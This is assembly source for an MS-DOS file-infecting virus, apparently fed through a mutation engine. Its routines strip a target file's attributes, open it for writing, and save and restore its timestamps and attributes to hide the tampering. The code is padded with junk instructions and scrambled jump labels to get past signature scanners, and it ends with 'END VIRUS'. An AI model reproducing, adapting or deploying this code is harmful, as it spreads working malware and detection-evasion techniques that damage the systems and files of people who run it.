JMP HIOP_
BIRNO:
JZ GSXOK
JMP GUSQF
GSXOK:
	 int 21H 
AMUYB:
		call 	 RNYNF
OMWJQ:
		call 	 FRCFT
HIOP_:
		call 	 BIRNO
IBGQY:
		call 	 NNOQW
EVFGN:
		call 	 IXXMU
VMUYF:
		call 	 BTUZO
JIHZE:
		call 	 DVEQC
	 ret

RESTORE_DTA:
		JMP 	XBTYH
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
XBTYH:
	 mov dx,WORD PTR [OLDDTA] 
		JMP 	OMWJQ
FRCFT:
	 mov ax,WORD PTR [OLDDTA+2]
		JMP 	JIHZE
DVEQC:
JNZ BTUZO
JMP VMUYF
BTUZO:
		JMP 	RSYAM
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
RSYAM:
	 mov ds,ax
RAYN_:
JZ RNYNF
JMP AMUYB
RNYNF:
		JMP 	WUEMJ
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
WUEMJ:
		JMP 	PJTZU
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
PJTZU:
	 mov ah,1AH
	 int 21H 
	 mov ax,cs 
JZ TXSJG
JMP FELRY
TXSJG:
		JMP 	AUUXC
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
AUUXC:
	 mov ds,ax
FQQDD:
		call 	 EURRR
QKCGB:
		call 	 ZRTZJ
FELRY:
		call 	 TXSJG
FMDLV:
		call 	 KBVPF
	 ret	 

SAVE_ATTRIBUTE:
		JMP 	MMZNC
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
MMZNC:
	 mov ah,43H 
		JMP 	FQQDD
EURRR:
		JMP 	TIZOQ
xor bx,cx
xor bx,cx
xor bx,cx
TIZOQ:
		JMP 	GDRSM
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
GDRSM:
		JMP 	ITIAG
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ITIAG:
	 mov al,0
JNZ ZRTZJ
JMP QKCGB
ZRTZJ:
		JMP 	CTWLE
nop
nop
nop
nop
nop
nop
nop
CTWLE:
	 mov dx,OFFSET USEFILE
		JMP 	FMDLV
KBVPF:
_ETSM:
	 int 21H
		JMP 	CVLZW
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
CVLZW:
	 mov [FATTR],cl 
YARPI:
		JMP 	_HQSG
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
_HQSG:
	 mov ah,43H
DSDDZ:
_RDMJ:
	 mov al,1
YFPDL:
	 mov dx,OFFSET USEFILE
VOCFY:
GV_PJ:
	 mov cl,0
	 int 21H
		JMP 	PQRJD
cmp ax,bx
PQRJD:
	 mov dx,OFFSET USEFILE
GFZCL:
	 mov al,2 
ERRUY:
	 mov ah,3DH 
F_FYY:
	 int 21H
	 mov [HANDLE],ax 
NKEWO:
		JMP 	NEHBN
nop
nop
nop
nop
nop
NEHBN:
	 mov ah,57H 
JGMII:
ODVIZ:
ZYM_U:
	 xor al,al
		JMP 	ZFDUD
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
ZFDUD:
		JMP 	OKXRV
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OKXRV:
	 mov bx,[HANDLE]
KVHSY:
MOZZT:
JKUMO:
		JMP 	NBJVJ
AVTLC:
	 int 21H
	 mov [FTIME],cx 
IGTUF:
	 mov [FDATE],dx 
DMVQG:
XPLSO:
TSOGY:
	 mov ax,WORD PTR [DTA1+28] 
XGQXM:
BFGLT:
	 mov WORD PTR [FSIZE+2],ax 
WQQDZ:
		JMP 	TOXOE
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
TOXOE:
	 mov ax,WORD PTR [DTA1+26] 
FDSLX:
JZ NTLBL
JMP GB_LS
NTLBL:
		JMP 	OEMUT
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
OEMUT:
	 mov WORD PTR [FSIZE],ax
GB_LS:
		call 	 NTLBL
 	 ret

NBJVJ:
		call 	 AVTLC


REST_ATTRIBUTE:
		JMP 	VLQ_W
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
VLQ_W:
		JMP 	WK_YV
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
WK_YV:
		JMP 	QROES
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
QROES:
		JMP 	PQVXO
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
cmp cx,dx
PQVXO:
	 mov dx,[FDATE] 
		JMP 	K_LET
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
K_LET:
	 mov cx,[FTIME]
DPRHR:
		JMP 	EABJZ
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
EABJZ:
	 mov ah,57H 
MMZKH:
CPIWN:
	 mov al,1
XAJNU:
_MZUS:
		JMP 	YRSIY
nop
nop
nop
nop
nop
nop
nop
nop
nop
YRSIY:
	 mov bx,[HANDLE]
IUILM:
	 int 21H
		JMP 	RASPR
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
cmp ax,bx
RASPR:
	 mov ah,3EH
PMQRH:
		JMP 	LDAPY
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
xor bx,cx
LDAPY:
	 mov bx,[HANDLE]
ZBWCM:
JZ __NCX
JMP BJZLD
__NCX:
		JMP 	CTJNZ
IMKUF:
	 int 21H
		JMP 	VFY_V
nop
nop
nop
nop
VFY_V:
	 mov cl,[FATTR]
DXCSD:
BOXLV:
JNZ FZSKS
JMP Q_APO
FZSKS:
JZ NIKA_
JMP MZTVO
NIKA_:
	 xor ch,ch
	 mov ah,43H 
		JMP 	DLGQO
JUBQ_:
	 mov al,1
	 mov dx,OFFSET USEFILE
JZ V__FN
JMP MYIRW
V__FN:
	 int 21H
CTJNZ:
		call 	 IMKUF
BJZLD:
		call 	 __NCX
MZTVO:
		call 	 NIKA_
DLGQO:
		call 	 JUBQ_
Q_APO:
		call 	 FZSKS
MYIRW:
		call 	 V__FN
	 ret

FINAL: 

VSEG ENDS 	 

VSTACK SEGMENT PARA STACK
 	   db STACKSIZE dup (?)
VSTACK ENDS
	   END VIRUS 
